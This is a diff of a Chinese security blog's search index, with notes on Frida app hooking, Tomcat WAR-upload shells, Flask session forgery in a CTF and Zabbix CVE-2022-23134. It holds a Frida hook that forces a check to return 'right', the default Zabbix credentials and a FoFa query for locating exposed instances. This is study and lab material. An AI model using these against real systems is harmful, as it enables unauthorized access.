+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>本文主要记录了Frida的一些模板和配置及一些场景目录和问题记录<br>前提是已经安装了Frida，查看其他文章</p></blockquote><h1 id="启动和配置"><a href="#启动和配置" class="headerlink" title="启动和配置"></a>启动和配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /data/local/tmp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 修改 文件 权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 frida-server</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行文件</span></span><br><span class="line">./frida-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line"></span><br><span class="line"> frida-ps -U</span><br></pre></td></tr></table></figure><h1 id="Frida的一些模板和配置"><a href="#Frida的一些模板和配置" class="headerlink" title="Frida的一些模板和配置"></a>Frida的一些模板和配置</h1><h2 id="python模板"><a href="#python模板" class="headerlink" title="python模板"></a>python模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义消息回调函数，接收 Frida 脚本发送的消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用包名来附加目标应用并执行 JS 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_target_application</span>(<span class="params">app_name, js_file</span>):</span><br><span class="line">    <span class="comment"># JavaScript 脚本内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(js_file, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        script_source = fin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 USB 设备并通过包名附加到目标应用</span></span><br><span class="line">    <span class="comment"># 也可以使用进程id</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pid = device.spawn(package_name)</span></span><br><span class="line">    <span class="comment"># print(pid)</span></span><br><span class="line">    process = device.attach(app_name)</span><br><span class="line">    <span class="comment"># 创建并加载脚本</span></span><br><span class="line">    script = process.create_script(script_source)</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待用户输入停止信号</span></span><br><span class="line">    sys.stdin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卸载脚本并分离进程</span></span><br><span class="line">    script.unload()</span><br><span class="line">    process.detach()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置目标应用的包名</span></span><br><span class="line">    app_name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line"> </span><br><span class="line">    js_file = <span class="string">&quot;scripts/js_file.js&quot;</span></span><br><span class="line">    <span class="comment"># 调用函数进行 hook</span></span><br><span class="line">    hook_target_application(app_name, js_file)</span><br></pre></td></tr></table></figure><h2 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 JNI 类</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.myapplication.MainActivity&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 getResult 方法</span></span><br><span class="line">    <span class="title class_">Activity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult called with:&#x27;</span>, str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">check</span>(str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult returned:&#x27;</span>, result);</span><br><span class="line">        <span class="comment">// 返回原始结果</span></span><br><span class="line">        result = <span class="string">&quot;right&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><p><code>process = device.attach(app_name)</code> 如果使用包名的话，会报错，需要使用进程id或者应用名称</p><h2 id="Github也有这个issue"><a href="#Github也有这个issue" class="headerlink" title="Github也有这个issue?"></a>Github也有这个issue?</h2><p><a href="/../assets/img/image-120.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-120.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> APP逆向 </tag>
+            
+            <tag> 移动安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>网络安全打靶总结</title>
       <link href="/2024/11/13/2024-10-17-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E6%80%BB%E7%BB%93/"/>
       <url>/2024/11/13/2024-10-17-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E6%80%BB%E7%BB%93/</url>
@@ -417,33 +486,6 @@
             <tag> HTB </tag>
             
             <tag> OFFSEC </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Frida的一些模板和配置及一些场景目录和问题记录</title>
-      <link href="/2024/11/13/2024-11-08-Frida-Template/"/>
-      <url>/2024/11/13/2024-11-08-Frida-Template/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>本文主要记录了Frida的一些模板和配置及一些场景目录和问题记录<br>前提是已经安装了Frida，查看其他文章</p></blockquote><h1 id="启动和配置"><a href="#启动和配置" class="headerlink" title="启动和配置"></a>启动和配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /data/local/tmp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 修改 文件 权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 frida-server</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行文件</span></span><br><span class="line">./frida-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line"></span><br><span class="line"> frida-ps -U</span><br></pre></td></tr></table></figure><h1 id="Frida的一些模板和配置"><a href="#Frida的一些模板和配置" class="headerlink" title="Frida的一些模板和配置"></a>Frida的一些模板和配置</h1><h2 id="python模板"><a href="#python模板" class="headerlink" title="python模板"></a>python模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义消息回调函数，接收 Frida 脚本发送的消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用包名来附加目标应用并执行 JS 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_target_application</span>(<span class="params">app_name, js_file</span>):</span><br><span class="line">    <span class="comment"># JavaScript 脚本内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(js_file, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        script_source = fin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 USB 设备并通过包名附加到目标应用</span></span><br><span class="line">    <span class="comment"># 也可以使用进程id</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pid = device.spawn(package_name)</span></span><br><span class="line">    <span class="comment"># print(pid)</span></span><br><span class="line">    process = device.attach(app_name)</span><br><span class="line">    <span class="comment"># 创建并加载脚本</span></span><br><span class="line">    script = process.create_script(script_source)</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待用户输入停止信号</span></span><br><span class="line">    sys.stdin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卸载脚本并分离进程</span></span><br><span class="line">    script.unload()</span><br><span class="line">    process.detach()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置目标应用的包名</span></span><br><span class="line">    app_name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line"> </span><br><span class="line">    js_file = <span class="string">&quot;scripts/js_file.js&quot;</span></span><br><span class="line">    <span class="comment"># 调用函数进行 hook</span></span><br><span class="line">    hook_target_application(app_name, js_file)</span><br></pre></td></tr></table></figure><h2 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 JNI 类</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.myapplication.MainActivity&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 getResult 方法</span></span><br><span class="line">    <span class="title class_">Activity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult called with:&#x27;</span>, str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">check</span>(str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult returned:&#x27;</span>, result);</span><br><span class="line">        <span class="comment">// 返回原始结果</span></span><br><span class="line">        result = <span class="string">&quot;right&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><p><code>process = device.attach(app_name)</code> 如果使用包名的话，会报错，需要使用进程id或者应用名称</p><h2 id="Github也有这个issue"><a href="#Github也有这个issue" class="headerlink" title="Github也有这个issue?"></a>Github也有这个issue?</h2><p><a href="/../assets/img/image-120.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-120.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> APP逆向 </tag>
-            
-            <tag> 移动安全 </tag>
             
         </tags>
       
@@ -483,33 +525,6 @@
     
     
     <entry>
-      <title>Web中间件-Tomcat8</title>
-      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
-      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Web中间件 </tag>
-            
-            <tag> Tomcat </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>MonitorsThree</title>
       <link href="/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"/>
       <url>/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/</url>
@@ -529,6 +544,33 @@
             <tag> Linux </tag>
             
             <tag> THB </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web中间件-Tomcat8</title>
+      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
+      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web中间件 </tag>
+            
+            <tag> Tomcat </tag>
             
         </tags>
       
@@ -831,33 +873,6 @@
     
     
     <entry>
-      <title>CISCN2021总决赛babypython</title>
-      <link href="/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/"/>
-      <url>/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h1><p>伪造session，获取flag</p><ol><li><a href="/../assets/img/image-86.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-86.png" alt="alt text"></a></li></ol><p><code>uuid.getnode()</code>函数可以获取网卡mac地址并转换成十进制数返回</p><ol start="2"><li><p>获取网卡mac地址<br> <a href="/../assets/img/image-87.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-87.png" alt="alt text"></a></p></li><li><p>伪造session<br>flask manage session 为flask的session管理器，可以伪造session</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> WebSec </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> Web </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>CVE-2021-44228</title>
       <link href="/2024/11/13/2024-09-04-CVE-2021-44228/"/>
       <url>/2024/11/13/2024-09-04-CVE-2021-44228/</url>
@@ -879,6 +894,33 @@
             <tag> CVE </tag>
             
             <tag> Sec </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CISCN2021总决赛babypython</title>
+      <link href="/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/"/>
+      <url>/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h1><p>伪造session，获取flag</p><ol><li><a href="/../assets/img/image-86.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-86.png" alt="alt text"></a></li></ol><p><code>uuid.getnode()</code>函数可以获取网卡mac地址并转换成十进制数返回</p><ol start="2"><li><p>获取网卡mac地址<br> <a href="/../assets/img/image-87.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-87.png" alt="alt text"></a></p></li><li><p>伪造session<br>flask manage session 为flask的session管理器，可以伪造session</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> WebSec </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
             
         </tags>
       
@@ -1705,31 +1747,6 @@
     
     
     <entry>
-      <title>社会中的软技能</title>
-      <link href="/2024/11/13/2024-03-17-softskils/"/>
-      <url>/2024/11/13/2024-03-17-softskils/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="社会中的软技能"><a href="#社会中的软技能" class="headerlink" title="社会中的软技能"></a>社会中的软技能</h1><ol><li><p>交流能力<br>交流能力是非常重要的，减少内耗，不要盲目自我消化，首先查询从互联网上。</p></li><li><p>解决问题的能力</p></li><li><p>认识别人的能力。</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> career </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> skills </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Django</title>
       <link href="/2024/11/13/2024-03-19-Django/"/>
       <url>/2024/11/13/2024-03-19-Django/</url>
@@ -1749,6 +1766,31 @@
             <tag> Python </tag>
             
             <tag> Django </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>社会中的软技能</title>
+      <link href="/2024/11/13/2024-03-17-softskils/"/>
+      <url>/2024/11/13/2024-03-17-softskils/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="社会中的软技能"><a href="#社会中的软技能" class="headerlink" title="社会中的软技能"></a>社会中的软技能</h1><ol><li><p>交流能力<br>交流能力是非常重要的，减少内耗，不要盲目自我消化，首先查询从互联网上。</p></li><li><p>解决问题的能力</p></li><li><p>认识别人的能力。</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> career </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> skills </tag>
             
         </tags>
       
@@ -2025,11 +2067,11 @@
     
     
     <entry>
-      <title>CVE-2022-23134</title>
-      <link href="/2024/11/13/2024-02-19-CVE-2022-23134/"/>
-      <url>/2024/11/13/2024-02-19-CVE-2022-23134/</url>
+      <title>CVE-2022-32991</title>
+      <link href="/2024/11/13/2024-02-20-CVE-2022-32991/"/>
+      <url>/2024/11/13/2024-02-20-CVE-2022-32991/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2022-23134"><a href="#CVE-2022-23134" class="headerlink" title="CVE-2022-23134"></a>CVE-2022-23134</h2><ol><li>描述</li></ol><p>Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p><ol start="2"><li>分析<br><a href="https://img2.imgtp.com/2024/03/02/gXvwQ71v.png" title="1709358782253.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/gXvwQ71v.png" alt="1709358782253.png"></a></li></ol><h2 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h2><p><code>Title=&quot;Zabbix&quot; &amp;&amp; body=&quot;Zabbix SIA&quot;</code></p><p>弱口令：<code>Admin/zabbix</code></p><p><a href="https://img2.imgtp.com/2024/03/02/LifiuzlA.png" title="1709359619020.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/LifiuzlA.png" alt="1709359619020.png"></a></p><p><a href="https://img2.imgtp.com/2024/03/02/CF8WaglB.png" title="1709359666403.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/CF8WaglB.png" alt="1709359666403.png"></a></p><p><a href="https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png" title="1709359728362.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png" alt="1709359728362.png"></a></p><p>flag{3669658d-5ca3-47d7-943c-3d985df13fab}</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
